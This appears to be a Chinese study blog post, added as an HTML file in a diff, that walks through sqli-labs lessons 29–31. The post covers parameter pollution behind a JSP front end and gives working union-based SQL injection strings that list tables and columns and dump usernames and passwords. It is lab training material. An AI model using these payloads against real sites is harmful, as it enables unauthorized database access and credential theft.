@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="lesson 29首先是了解服务器两层架构参考mysql注入天书之服务器 总之就是要再去搭一个jsp的平台来 同时打开phpstudy和jspstudy 通过index.jsp访问到index.php生成的页面 （buuctf里面的lesson29完全没意义，就跟lesson1一样，老坑人了，这里最好自己搭一个）  通过修改第一个id发现回显不会发生变化，且注入会被拦截  但是修改第二个id则会回">
+<meta property="og:type" content="article">
+<meta property="og:title" content="lesson29_31">
+<meta property="og:url" content="http://example.com/2022/02/01/lesson29/index.html">
+<meta property="og:site_name" content="wds&#39;s 学习博客">
+<meta property="og:description" content="lesson 29首先是了解服务器两层架构参考mysql注入天书之服务器 总之就是要再去搭一个jsp的平台来 同时打开phpstudy和jspstudy 通过index.jsp访问到index.php生成的页面 （buuctf里面的lesson29完全没意义，就跟lesson1一样，老坑人了，这里最好自己搭一个）  通过修改第一个id发现回显不会发生变化，且注入会被拦截  但是修改第二个id则会回">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/02/13/496ZE8RYbSBfMUC.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/13/7Df26N8sAyEFiRe.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/13/9NX1JIVvGoyLdQ8.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/13/IBRWVCXS9Z3LEvp.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/13/a4Cupvjb932Dtyl.png">
+<meta property="og:image" content="https://s2.loli.net/2022/02/13/voqCabJnfQHSrze.png">
+<meta property="article:published_time" content="2022-02-01T11:57:27.000Z">
+<meta property="article:modified_time" content="2022-02-18T12:28:34.000Z">
+<meta property="article:author" content="wang deshan">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/02/13/496ZE8RYbSBfMUC.png">
+
+
+<link rel="canonical" href="http://example.com/2022/02/01/lesson29/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2022/02/01/lesson29/","path":"2022/02/01/lesson29/","title":"lesson29_31"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>lesson29_31 | wds's 学习博客</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="wds's 学习博客" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">wds's 学习博客</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">个人势学习分享网站，闲记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson-29"><span class="nav-number">1.</span> <span class="nav-text">lesson 29</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A6%96%E5%85%88%E6%98%AF%E4%BA%86%E8%A7%A3%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%A4%E5%B1%82%E6%9E%B6%E6%9E%84"><span class="nav-number">1.1.</span> <span class="nav-text">首先是了解服务器两层架构</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson-30"><span class="nav-number">2.</span> <span class="nav-text">lesson 30</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson-31"><span class="nav-number">3.</span> <span class="nav-text">lesson 31</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wang deshan"
+      src="/uploads/avatar.jpg">
+  <p class="site-author-name" itemprop="name">wang deshan</p>
+  <div class="site-description" itemprop="description">ctf/python/c++</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+
+
+
+<div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/01/lesson29/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="ctf/python/c++">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          lesson29_31
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-02-01 19:57:27" itemprop="dateCreated datePublished" datetime="2022-02-01T19:57:27+08:00">2022-02-01</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-02-18 20:28:34" itemprop="dateModified" datetime="2022-02-18T20:28:34+08:00">2022-02-18</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="lesson-29"><a href="#lesson-29" class="headerlink" title="lesson 29"></a>lesson 29</h1><h2 id="首先是了解服务器两层架构"><a href="#首先是了解服务器两层架构" class="headerlink" title="首先是了解服务器两层架构"></a>首先是了解服务器两层架构</h2><p>参考<a target="_blank" rel="noopener" href="https://www.cnblog.com/lcamry/p/5762961.html">mysql注入天书之服务器</a></p>
+<p>总之就是要再去搭一个jsp的平台来</p>
+<p>同时打开phpstudy和jspstudy</p>
+<p>通过index.jsp访问到index.php生成的页面</p>
+<p>（buuctf里面的lesson29完全没意义，就跟lesson1一样，老坑人了，这里最好自己搭一个）</p>
+<p><img src="https://s2.loli.net/2022/02/13/496ZE8RYbSBfMUC.png" alt="QQ截图20220213145419.png"></p>
+<p>通过修改第一个id发现回显不会发生变化，且注入会被拦截</p>
+<p><img src="https://s2.loli.net/2022/02/13/7Df26N8sAyEFiRe.png" alt="QQ截图20220213150822.png"></p>
+<p>但是修改第二个id则会回显id对应的username和password，且超出数据 会报错</p>
+<p>所以第二个id处可注入</p>
+<p>联合查询，步骤参考lesson 1</p>
+<p>?id=1&amp;id=-1’ union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
+<p><img src="https://s2.loli.net/2022/02/13/9NX1JIVvGoyLdQ8.png" alt="QQ截图20220213151441.png"></p>
+<p>?id=1&amp;id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p>
+<p><img src="https://s2.loli.net/2022/02/13/IBRWVCXS9Z3LEvp.png" alt="QQ截图20220213152239.png"></p>
+<h1 id="lesson-30"><a href="#lesson-30" class="headerlink" title="lesson 30"></a>lesson 30</h1><p>和29差不多，不过是数据的包裹变成了双引号</p>
+<p><img src="https://s2.loli.net/2022/02/13/a4Cupvjb932Dtyl.png" alt="QQ截图20220213154154.png"></p>
+<p>查库</p>
+<p>?id=1&amp;id=-3”union select 1,database(),3–+</p>
+<p>查表</p>
+<p>?id=1&amp;id=-3”union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
+<p>查列</p>
+<p>?id=1&amp;id=-3”union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=’users’–+</p>
+<p>查字段</p>
+<p>?id=1&amp;id=-3”union select 1,database(),group_concat(concat_ws(‘@@’,username,password)) from security.users–+</p>
+<h1 id="lesson-31"><a href="#lesson-31" class="headerlink" title="lesson 31"></a>lesson 31</h1><p>和前面一样</p>
+<p>就是对数据的包裹变成了双引号加括号的形式</p>
+<p>?id=1&amp;id=-3”) union select 1,2,3–+</p>
+<p><img src="https://s2.loli.net/2022/02/13/voqCabJnfQHSrze.png" alt="QQ截图20220213155229.png"></p>
+<p>?id=1&amp;id=-3”) union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=’security’–+</p>
+<p>?id=1&amp;id=-3”) union select 1,database(),group_concat(column_name)from information_schema.columns where table_name=’users’–+</p>
+<p>?id=1&amp;id=-3”) union select 1,database(),group_concat(concat_ws(0x7e,username,password))from security.users–+</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/02/01/lesson32/" rel="prev" title="lesson32_36">
+                  <i class="fa fa-chevron-left"></i> lesson32_36
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/02/02/lesson37/" rel="next" title="lesson37_41">
+                  lesson37_41 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wang deshan</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
